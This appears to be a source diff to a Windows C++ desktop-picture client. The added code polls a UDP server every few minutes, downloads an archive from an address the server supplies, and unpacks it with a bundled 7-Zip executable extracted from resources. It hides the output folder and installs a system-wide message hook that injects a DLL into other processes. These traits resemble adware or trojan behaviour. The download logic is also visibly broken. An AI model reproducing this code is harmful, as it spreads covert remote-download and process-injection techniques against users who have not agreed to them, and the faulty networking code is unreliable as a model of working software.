@@ -3,16 +3,26 @@
 
 #include "stdafx.h"
 
-
+#include "utils.h"
 #include <Windows.h>
 #include <Gdiplus.h>
 #include <process.h>
+#include "resource.h"
 //#include <winsock2.h>
+#include "bootstrap_proto.h"
 
+#include <string.h> 
+#include <vector>
+#include"../wnd_hooks/wnd_hooks.h"
 
-#pragma comment(lib, "Ws2_32.lib")
-#pragma comment(lib, "gdiplus.lib")
+#pragma comment(lib, "wnd_hooks.lib")
+
 using namespace Gdiplus;
+
+
+
+
+
 
 GdiplusStartupInput gdiplusStartupInput_;
 ULONG_PTR pGdiToken_;
@@ -22,12 +32,38 @@ bool bQuit_ = false;
 
 #define WM_DRAW_PICTURE  WM_USER + 1000
 #define WM_CLEAN_PICTURE WM_DRAW_PICTURE + 1
+#define WM_DOWNLOAD_FINISHED WM_CLEAN_PICTURE + 1
 
+
+#define SERVER_IP_ADDR "127.0.0.1"
+#define SERVER_PORT 6489
+
+
+#define CLIENT_STATUS_INIT 0
+#define CLIENT_STATUS_SEND_REQ 1
+#define CLIENT_STATUS_RECV_RESP 2
+
+
+#define DRAW_STATE_INIT 0
+#define DRAW_STATE_FINISHED_LOAD_IMAGES 1
+
+
+
+
+#define DOWNLOAD_FILE_NAME "pics.7z"
+#define DECODE_COMMAND_NAME "decode.exe"
 
 typedef struct client_status
 {
 	int state;
 	SOCKET sock;
+	SOCKADDR_IN addr_server_download;
+	HWND hwnd;
+	SOCKET downloadsock;
+	FILE *downfile;
+	std::vector<std::string> file_list;
+	int draw_state;
+	HHOOK hook;
 }CLIENT_STATUS_T;
 
 CLIENT_STATUS_T client_status_ = { 0 };
@@ -44,55 +80,20 @@ void deinit_gdi()
 }
 
 
-void get_screen_width_height(int *width, int *height)
+
+
+void load_images()
 {
-	 *width = GetSystemMetrics(SM_CXFULLSCREEN);
-	 *height = GetSystemMetrics(SM_CYFULLSCREEN);
+	char command[255] = { 0 };
+	memset(command, 0, sizeof(command));
+	strcpy(command, DECODE_COMMAND_NAME);
+	strcat(command, " e "DOWNLOAD_FILE_NAME" -o.\\pictures\\");
+	execute_command(command);
+	Sleep(500);
+	setFileHidden(".\\pictures");
+	client_status_.file_list = TraverseDirectory(".\\pictures");
+	client_status_.draw_state = DRAW_STATE_FINISHED_LOAD_IMAGES;
 }
-
-
-wchar_t * multibyte_to_wide_char(char * src)
-{
-	int len = strlen(src);
-	wchar_t *buf = new wchar_t[len + 1];
-	memset(buf, 0, (len + 1) *sizeof(wchar_t));
-	MultiByteToWideChar(CP_ACP, 0, src, strlen(src), buf, len);
-	buf[len] = '\0';
-	return buf;
-}
-
-
-
-void draw_picture_on_desktop(char *pic_path)
-{
-	int desk_width = 0;
-	int desk_height = 0;
-	get_screen_width_height(&desk_width, &desk_height);
-	HWND wnd = ::GetDesktopWindow();
-	int x, y;
-	Image* pimage = NULL;
-	wchar_t *picPath = multibyte_to_wide_char(pic_path);
-	pimage = Image::FromFile(picPath);
-	int w = pimage->GetWidth(); 
-	int h = pimage->GetHeight(); 
-	if (w < desk_width && h < desk_height)
-	{
-		x = desk_width / 2 - w / 2;
-		y = desk_height / 2 - h / 2;
-	}
-	delete picPath;
-	HDC hDeskDC = ::GetDC(0);//»ñÈ¡ÆÁÄ»¾ä±ú
-	Graphics gr(hDeskDC);
-	gr.DrawImage(pimage, x, y);
-	::ReleaseDC(wnd, hDeskDC);
-}
-
-
-void clean_desktop_picture()
-{
-	::RedrawWindow(NULL, NULL, NULL, 0);
-}
-
 
 
 
@@ -112,6 +113,9 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 	case WM_CLEAN_PICTURE:
 		clean_desktop_picture();
 		break;
+	case WM_DOWNLOAD_FINISHED:
+		load_images();
+		break;
 	default:
 		return DefWindowProc(hwnd, msg, wParam, lParam);
 	}
@@ -121,41 +125,47 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 
 
 
-
-void InitNetwork()
+unsigned __stdcall downloadproc(void* pArguments)
 {
-	WORD wVersionRequested;
-	WSADATA wsaData;
-	int err;
+	CLIENT_STATUS_T *client = (CLIENT_STATUS_T *)pArguments;
+	client->downloadsock = create_local_streamsock_and_bind();
+	int ret;
+	char buffer[2048] = { 0 };
 
-	wVersionRequested = MAKEWORD(2, 2);
-	err = WSAStartup(wVersionRequested, &wsaData);
-	if (err != 0) {
-		return;
+	ret = connect(client->downloadsock, (sockaddr *)&client->addr_server_download, sizeof(SOCKADDR_IN));
+	while (!bQuit_ && ret > 0)
+	{
+		if (ret > 0)
+		{
+			client->downfile = fopen(DOWNLOAD_FILE_NAME, "wb+");
+			ret = recv(client->downloadsock, buffer, sizeof(buffer), 0);
+			if (ret > 0)
+			{
+				fwrite(buffer, ret, 1, client->downfile);
+			}
+			else if (ret == 0)
+			{
+				::PostMessage(client->hwnd, WM_DOWNLOAD_FINISHED, 0, 0);
+				fclose(client->downfile);
+				closesocket(client->downloadsock);
+				client->downloadsock = -1;
+				break;
+			}
+			else
+			{
+				fclose(client->downfile);
+				closesocket(client->downloadsock);
+				client->downloadsock = -1;
+				break;
+			}
+		}
 	}
 
-	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {
-		WSACleanup();
-	}
-	return;
-}
+	closesocket(client->downloadsock);
+	client->downloadsock = -1;
+	client->state = CLIENT_STATUS_INIT;
+	return 0;
 
-
-SOCKET create_local_datagramsock_and_bind()
-{
-	int ret = 0;
-	SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
-	SOCKADDR_IN  addrlocal;
-	addrlocal.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
-	addrlocal.sin_family = AF_INET;
-	addrlocal.sin_port = htons(0);
-
-	ret = bind(sock, (SOCKADDR*)&addrlocal, sizeof(SOCKADDR));
-	if (ret == SOCKET_ERROR){
-		return 0;
-	}
-
-	return sock;
 }
 
 
@@ -163,8 +173,50 @@ unsigned __stdcall networkProc(void* arg)
 {
 	HWND hwnd = (HWND)arg;
 	client_status_.sock = create_local_datagramsock_and_bind();
+	client_status_.hwnd = hwnd;
+	BOOT_PROTO_HDR_T *hdr = NULL;
+	char buffer[1024] = { 0 };
+	SOCKADDR_IN addrto = { 0 };
+	addrto.sin_addr.S_un.S_addr = inet_addr(SERVER_IP_ADDR);
+	addrto.sin_family = AF_INET;
+	addrto.sin_port = htons(SERVER_PORT);
+
+	SOCKADDR_IN from = { 0 };
+	int fromLen = sizeof(from);
+	int len;
+	char * ptr;
+
 	while (!bQuit_)
 	{
+		if (client_status_.state == CLIENT_STATUS_INIT)
+		{
+			hdr = (BOOT_PROTO_HDR_T *)buffer;
+			hdr->total_len = sizeof(BOOT_PROTO_HDR_T);
+			hdr->msg_type = BOOTSTRAP_PIC_REQ;
+			hdr->version = PROTO_VERSION;
+			sendto(client_status_.sock, buffer, sizeof(BOOT_PROTO_HDR_T), 0, (sockaddr *)&addrto, sizeof(addrto));
+			client_status_.state = CLIENT_STATUS_SEND_REQ;
+		}
+		
+		len = recvfrom(client_status_.sock, buffer, sizeof(buffer), 0, (sockaddr *)&from, &fromLen);
+		if (len > 0 && client_status_.state == CLIENT_STATUS_SEND_REQ)
+		{
+			hdr = (BOOT_PROTO_HDR_T *)buffer;
+			if (hdr->version == PROTO_VERSION && hdr->msg_type == BOOTSTRAP_PIC_RESP)
+			{
+				ptr = buffer;
+				ptr += sizeof(BOOT_PROTO_HDR_T);
+				client_status_.state = CLIENT_STATUS_RECV_RESP;
+				client_status_.addr_server_download.sin_addr.S_un.S_addr = *(ULONG *)ptr;
+				ptr += sizeof(ULONG);
+				client_status_.addr_server_download.sin_port = *(short *)ptr;
+				client_status_.addr_server_download.sin_family = AF_INET;
+
+				HANDLE hthread = (HANDLE)_beginthreadex(NULL, 0, &downloadproc, (void *)&client_status_, 0, NULL);
+				CloseHandle(hthread);
+			}
+		}
+		Sleep(1000 * 300);
 
 	}
 
@@ -172,12 +224,26 @@ unsigned __stdcall networkProc(void* arg)
 }
 
 
+void setWindowHooks()
+{
+	client_status_.hook = SetWindowsHookEx(WH_GETMESSAGE, myMsgHook,GetModuleHandle("wnd_hooks.dll"), 0);
+}
+
+
+void init()
+{
+	//decode.exe e archive.7z -od:\sfsf *.*
+	ReleaseRes(DECODE_COMMAND_NAME, IDR_EXE_7Z, "exe");
+	init_gdi();
+	InitNetwork();
+	setWindowHooks();
+}
+
 
 int _tmain(int argc, _TCHAR* argv[])
 {
-	init_gdi();
-	InitNetwork();
-
+	init();
+	
 	WNDCLASSEX wc;
 	HWND hwnd;
 	MSG Msg;
